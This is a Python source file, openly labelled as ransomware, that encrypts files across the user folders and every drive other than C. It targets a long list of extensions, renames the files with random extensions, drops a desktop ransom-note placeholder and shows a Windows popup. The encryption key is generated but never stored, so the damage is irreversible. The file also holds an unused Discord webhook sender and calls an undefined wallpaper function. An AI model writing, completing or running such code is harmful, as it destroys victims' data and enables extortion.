import os
from cryptography.fernet import Fernet
import random
import string
import ctypes
import json
import requests
import concurrent.futures
import threading
import base64








##############################################################################################################################################
#################################################################### WEBHOOK #################################################################
##############################################################################################################################################






def send_discord_webhook_debug(message, webhook_url):
    headers = {'Content-Type': 'application/json'}
    data = {'content': message}
    response = requests.post(webhook_url, headers=headers, data=json.dumps(data))
    return response








##############################################################################################################################################
################################################################# RANSOMWARE #################################################################
##############################################################################################################################################



class ScanPC:
     
    def __init__(self) -> None:
        self.clientID = None
        self.key = None
        self.extensions_list = [
            # Audio Files
            '.aac', '.flac', '.m4a', '.mid', '.mp3', '.wav', '.wma',
            
            # Backup and Archive Files
            '.001', '.7z', '.ARC', '.PAQ', '.bak', '.bkp', '.bkf', '.bsa',
            '.cfr', '.dazip', '.dmp', '.gho', '.ibank', '.lbf', '.lrf',
            '.mdbackup', '.mpqge', '.pkpass', '.qdf', '.qic', '.re4',
            '.sav', '.sis', '.syncdb', '.tar', '.tar.bz2', '.tar.gz', '.tbk',
            '.tgz', '.upx', '.vtf', '.vfs0', '.zip',
            
            # Code and Script Files
            '.asm', '.asp', '.c', '.cpp', '.cs', '.css', '.d', '.java', 
            '.js', '.php', '.pl', '.py', '.rb', '.sh', '.vb', '.vbs',

            # Compressed Files
            '.7z', '.rar', '.tar', '.tar.bz2', '.tar.gz', '.tgz', '.zip',

            # Configuration Files
            '.cfg', '.config', '.conf', '.ini', '.json', '.xml', '.yaml',

            # Database Files
            '.accdb', '.db', '.dbf', '.frm', '.ibd', '.kdb', '.ldb', 
            '.mdf', '.mdb', '.myd', '.myi', '.odb', '.sdf', '.sql',
            '.sqlitedb', '.sqlite3', '.syncdb', 

            # Disk Image Files
            '.dmg', '.img', '.iso', '.qcow2', '.vdi', '.vmdk', '.vmx',

            # Document Files
            '.doc', '.docb', '.docm', '.docx', '.dot', '.dotm', '.dotx',
            '.odc', '.odf', '.odg', '.odp', '.ods', '.odt', '.pdf', 
            '.ppt', '.pptm', '.pptx', '.rtf', '.sldm', '.sldx', '.txt',
            '.wpd', '.wps', '.xlb', '.xlc', '.xls', '.xlsb', '.xlsm', 
            '.xlsx', '.xlt', '.xlw',

            # Email Files
            '.eml', '.mbx', '.msg', '.ost', '.pst', 

            # Executable Files
            '.apk', '.bat', '.bin', '.cmd', '.com', '.cpl', '.dll', 
            '.exe', '.gadget', '.jar', '.msc', '.msi', '.sys', 

            # Font Files
            '.fnt', '.fon', '.otf', '.ttf', 

            # Game Files
            '.big', '.bik', '.cas', '.dat', '.dazip', '.dmp', '.esm', 
            '.fos', '.gdb', '.iwd', '.lvl', '.map', '.mcgame', '.mpqge', 
            '.ncf', '.pak', '.psk', '.rim', '.sav', '.sb', '.sc2save', 
            '.srf', '.tor', '.upk', '.vdf', '.vpk', '.w3x', '.wmo', '.wotreplay', 
            '.ztmp',

            # Image Files
            '.3fr', '.ai', '.arw', '.bay', '.bmp', '.cdr', '.cr2', '.crw',
            '.dcr', '.dng', '.drf', '.eps', '.erf', '.gif', '.icxs', 
            '.indd', '.jpe', '.jpeg', '.jpg', '.kdc', '.mef', '.mrwref', 
            '.nef', '.nrw', '.orf', '.pcx', '.pef', '.png', '.ptx', 
            '.raf', '.raw', '.rw2', '.rwl', '.srf', '.srw', '.svg', 
            '.tif', '.tiff', '.wmf', 

            # Miscellaneous Files
            '.cer', '.crl', '.csr', '.crt', '.der', '.key', '.pem', 
            '.pfx', '.p7b', '.p7c', '.p12', '.rdp', '.rem', '.vob', 
            '.webm',

            # Presentation Files
            '.key', '.odp', '.pps', '.ppt', '.pptm', '.pptx', 

            # Programming and Source Files
            '.asm', '.bas', '.c', '.class', '.cpp', '.cs', '.d', 
            '.f', '.h', '.java', '.js', '.jsp', '.kt', '.lua', 
            '.m', '.pl', '.py', '.r', '.rb', '.scala', '.sh', 
            '.swift', '.vb', '.vbs',

            # Security and Encryption Files
            '.asc', '.cer', '.crt', '.der', '.gpg', '.key', '.pem', 
            '.pfx', 

            # Spreadsheet Files
            '.csv', '.dif', '.ods', '.ots', '.sdc', '.slk', '.xls', 
            '.xlsb', '.xlsm', '.xlsx', '.xlt', '.xlw',

            # System Files
            '.bak', '.bin', '.cab', '.cfg', '.chk', '.config', '.dll', 
            '.dmp', '.drv', '.ini', '.log', '.reg', '.rom', '.sys', 

            # Text Files
            '.ans', '.ascii', '.asc', '.csv', '.log', '.md', '.rst', 
            '.rtf', '.tex', '.txt', '.xml', 

            # Video Files
            '.3g2', '.3gp', '.asf', '.avi', '.flv', '.m4v', '.mkv', 
            '.mov', '.mp4', '.mpg', '.mpeg', '.ogv', '.rm', '.swf', 
            '.vob', '.webm', '.wmv',

            # Virtualization Files
            '.ova', '.ovf', '.qcow2', '.vdi', '.vhd', '.vhdx', '.vmdk', 
            '.vmx'
        ]
        self.num_of_files_encrypted = 0
        self.lock = threading.Lock()



    def get_valid_drives(self):
            valid_drives = []
            for drive in string.ascii_uppercase: 
                if os.path.exists(f'{drive}:\\'): 
                    if drive != "C":
                        valid_drives.append(f'{drive}:\\')  
            return valid_drives


    def run_scanner(self):
        drives = self.get_valid_drives()
        directories_to_scan = ["C:\\Users"] + drives


        max_workers = min(32, (os.cpu_count() or 4) + 4)

        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:

            futures = {executor.submit(self.find_all_files, directory): directory for directory in directories_to_scan}
            

            for future in concurrent.futures.as_completed(futures):
                directory = futures[future]
                try:
                    future.result()
                except Exception as exc:
                    print(f'Directory {directory} generated an exception: {exc}')
        
        print(f"Total files encrypted: {self.num_of_files_encrypted}")

    def find_all_files(self, directory):
        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
        for root, _, filenames in os.walk(directory):
            for filename in filenames:
                if filename.endswith(tuple(self.extensions_list)):
                    if filename == os.path.basename(__file__) or (filename == "readme.txt" and os.path.join(root, filename) == os.path.join(desktop_path, "readme.txt")):
                        continue 
                    full_path = os.path.join(root, filename)
                    try:
                        
                        self.encrypt_file(full_path)
                        
                        new_file_path = self.random_extension(full_path)
                        if new_file_path:

                            with self.lock:
                                self.log_encrypted_file(full_path, new_file_path)
                                self.num_of_files_encrypted += 1
                    except Exception as e:

                        print(f"Error processing file {full_path}: {e}")
                        pass



    def log_encrypted_file(self, old_path, new_path):
        """
        Logs the encrypted file path to a file. This is called one-by-one after each encryption.
        """
        try:
            with open(r"C:\ProgramData\Encrypted files.txt", "a", encoding='utf-8') as f:
                f.write(f"{old_path}:{new_path}\n")
        except Exception as e:
            print(f"Failed to write to log file: {e}")



    def generate_key(self):
        characters = string.ascii_letters + string.digits
        self.clientID = ''.join(random.choice(characters) for _ in range(8))
        self.key = Fernet.generate_key()


    def random_extension(self, file_path):

        random_ext = ''.join(random.choice(string.ascii_lowercase) for _ in range(3))
        random_ext = "." + random_ext
        

        directory = os.path.dirname(file_path)
        base_name = os.path.splitext(os.path.basename(file_path))[0]
        

        new_file_path = os.path.join(directory, base_name + random_ext)
        
        try:
            os.rename(file_path, new_file_path)
            print(f"File renamed to {new_file_path}")
        except Exception as e:
            print(f"An error occurred: {e}")
            return False

        return new_file_path




    def encrypt_file(self, filename, chunk_size=64 * 1024):
        cipher_suite = Fernet(self.key) # type: ignore

        temp_filename = filename + ".tmp"

        with open(filename, "rb") as file, open(temp_filename, "wb") as temp_file:
            while chunk := file.read(chunk_size):
                encrypted_data = cipher_suite.encrypt(chunk)
                temp_file.write(encrypted_data)

        os.replace(temp_filename, filename)




def create_file_on_desktop(file_name, content):

    if os.name == 'nt':
        desktop_path = os.path.join(os.environ['USERPROFILE'], 'Desktop')
    else:
        pass

    file_path = os.path.join(desktop_path, file_name)

    try:
        with open(file_path, 'w') as file:
            file.write(content)
        print(f"File created at: {file_path}")
    except Exception as e:
        print(f"An error occurred: {e}")


    











    
    
    
    
    
    
    
    
    
    
    


def run_ransomware():


    file_name = "README.txt"
    file_content = f""" RANSOM NOTE HERE """
    create_file_on_desktop(file_name, file_content)
    set_wallpaper()
    windows_popup_box()
    main = ScanPC()
    main.generate_key()
    main.run_scanner()
    

    
    




def windows_popup_box():
    title = "Important"
    message = "check readme file on your desktop"
        
        
    ctypes.windll.user32.MessageBoxW(0, message, title, 0)






##############################################################################################################################################
################################################################# MAIN LOOP ##################################################################
##############################################################################################################################################

if __name__ == '__main__':

    try:
        run_ransomware()
    except Exception as e:
        print("[ERR] %s" % str(e))
    
